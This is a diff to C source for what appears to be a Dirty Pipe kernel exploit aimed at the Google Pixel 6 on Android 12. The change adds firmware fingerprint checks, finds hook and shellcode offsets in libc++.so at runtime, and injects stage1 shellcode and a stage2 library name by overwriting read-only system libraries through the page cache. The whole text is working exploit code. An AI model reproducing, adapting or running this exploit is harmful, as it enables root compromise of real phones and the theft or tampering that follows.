@@ -36,7 +36,10 @@
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/user.h>
+#include <sys/system_properties.h>
 #include <errno.h>
+
+#include "stage2-symbol.h"
 
 #ifndef TMP_DIR
 #define TMP_DIR "/data/local/tmp"
@@ -54,6 +57,8 @@ extern char stage2_payload[];
 #ifndef PAGE_SIZE
 #define PAGE_SIZE 4096
 #endif
+
+int find_hook_target(const char *libcxx, uint64_t *hook_target, uint64_t *payload_target);
 
 /**
  * Create a pipe where all "bufs" on the pipe_inode_info ring have the
@@ -179,15 +184,55 @@ int main(int argc, char **argv)
 {
 	const char *stage1_lib = "/system/lib64/libc++.so";
 	const char *stage2_lib = "/system/lib/libldacBT_enc.so";
+	const char *stage2_param_libname = NULL;
 	size_t data_size;
+	uint64_t shellcode_offset = 0;
+	uint64_t hook_offset = 0;
+
+	char product[PROP_VALUE_MAX] = {};
+	char fingerprint[PROP_VALUE_MAX] = {};
+	__system_property_get("ro.build.product", product);
+	__system_property_get("ro.build.fingerprint", fingerprint);
+
+	if(strcmp(product, "oriole") == 0){
+		if(strcmp(fingerprint, "google/oriole/oriole:12/SQ1D.220205.004/8151327:user/release-keys") == 0){
+			// Pixel 6 2022-02-05
+			stage2_param_libname = "/vendor/lib/libstagefright_soft_mp3dec.so";
+		}else if(strcmp(fingerprint, "google/oriole/oriole:12/SP2A.220305.013.A3/8229987:user/release-keys") == 0){
+			// Pixel 6 2022-03-05
+			stage2_param_libname = "/vendor/lib/libstagefright_soft_mp3dec.so";
+		}else{
+			fprintf(stderr, "Unsupported version: Product=%s Fingerprint=%s\n", product, fingerprint);
+			return EXIT_FAILURE;
+		}
+	}else{
+		fprintf(stderr, "Unsupported product: Product=%s Fingerprint=%s\n", product, fingerprint);
+		return EXIT_FAILURE;
+	}
+	printf("Device version: Product=%s Fingerprint=%s\n", product, fingerprint);
+
+	if(find_hook_target(stage1_lib, &hook_offset, &shellcode_offset)){
+		fprintf(stderr, "Could not find hook target and shellcode offset from libc++.so\n");
+		return EXIT_FAILURE;
+	}
+	printf("Offset found: shellcode_offset: %lx hook_offset: %lx\n", shellcode_offset, hook_offset);
+
+	uint64_t empty_space = (PAGE_SIZE - (shellcode_offset % PAGE_SIZE)) % PAGE_SIZE;
+	printf("Empty space size: %ld bytes\n", empty_space);
+
+	if(stage1_len > empty_space){
+		fprintf(stderr, "Stage1 payload (%d bytes) is too large. Exit.\n", stage1_len);
+		return EXIT_FAILURE;
+	}
+
 	int run_index = load_run_index();
 
 	printf("Run index: %d\n", run_index);
 
 	// Shellcode is placed in empty space on .text
 	// Max size=544 bytes
-	size_t shellcode_offset = 0x000a2de0UL;
-	size_t hook_offset      = 0x0005a9dcUL;
+	//size_t shellcode_offset = 0x000a2de0UL;
+	//size_t hook_offset      = 0x0005a9dcUL;
 
 	// Aarch64 branch
 	const uint32_t BRANCH = 0x14000000;
@@ -206,6 +251,13 @@ int main(int argc, char **argv)
 	*(uint32_t *)&stage1_data[stage1_len - 4] = jmpback;
 
 	printf("Shell code size: %d 0x%x bytes\n", stage1_len, stage1_len);
+
+	// Embed stage2 libname
+	int libname_len = strlen(stage2_param_libname);
+	if(libname_len >= 128 - 1){
+		fprintf(stderr, "Too long libname: %s\n", stage2_param_libname);
+	}
+	memcpy(stage2_payload + stage2_libname_addr, stage2_param_libname, libname_len + 1);
 
 	int fd2 = open(stage2_lib, O_RDONLY); // yes, read-only! :-)
 	if (fd2 < 0) {
